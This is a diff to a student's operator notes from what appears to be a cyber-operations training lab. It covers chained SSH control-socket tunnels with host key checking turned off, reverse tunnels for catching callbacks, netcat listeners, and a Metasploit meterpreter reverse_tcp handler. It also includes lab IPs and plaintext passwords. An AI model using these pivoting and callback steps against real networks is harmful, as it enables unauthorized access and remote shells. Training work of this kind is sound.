@@ -62,17 +62,67 @@ SSH Tunneling:
 ssh -MS /tmp/T1 student14@127.0.0.1 -p <RHP> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
 ssh -S /tmp/T1 dummy -O forward -L 127.0.0.1:<RandomHighPort>:<Target/RemoteIP>:<RemoteSSHPORT>
 ssh -MS /tmp/T2 student14@127.0.0.1 -p <RHP> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
 
+xfreerdp /u:root /p:password /v:10.50.30.29:20014 /size:1920x1080 /multimon
 T1 Float IP: 10.50.38.103
 
+Lymon Op Notes Template
+F6 to add new foldable section
+F9 to fold section
 
+>T1:192.168.0.10
+->T2:192.168.0.20
+-->T3:192.168.0.30
+ssh -MS /tmp/T1 student14@192.168.0.10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+ssh -S /tmp/T1 dummy -O forward -L 127.0.0.1:7002:192.168.0.20:22
+ssh -MS /tmp/T2 student14@127.0.0.1 -p 7002 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+ssh -S /tmp/T2 dummy -O forward -L 127.0.0.1:7003:192.168.0.30:22
+ssh -MS /tmp/T3 student14@127.0.0.1 -p 7003 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
 
+Remote/Reverse Tunnels-Use for callback/--<
+============================================================================================
+-R <RemoteIP>:<RemotePort>:<LocalIP>:<LocalPort>
+RemoteIP is the IP receiving the callback/beacon
+nc -nvlp <LocalPort>
+DO NOT HIT CTRL+C IN NC SESSION
 
+Netcat
+============================================================================================
+nc 127.0.0.1 <port>  #banner grabbing
+nc -nvlp <port>      #nc as server/listener
 
+Demo
+============================================================================================
+Kali tabs (as many as T's +1)
+mkdir student14...
+cd all tabs into student dir
+vim notes
+scriptme in all tabs
+ssh
 
+>T1: <FLOAT_IP>
+->T2: 192.168.0.13
+--<T3: 192.168.0.9
+->T4: 192.168.0.27
+--<T5: 192.168.0.23
+-->T6: 192.168.0.10
+catch callback from T5
+ssh -S /tmp/T4 dummy -O forward -R 192.168.0.27:1721:0.0.0.0:5555
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 5555
+exploit
+shell
 
-
-
+Post-Process:
+cd ..
+tar -cvf student23... /student23...
+scp student23...tar student23@10.50.29.204:~
+pass:password23
+debrief
 
 
 
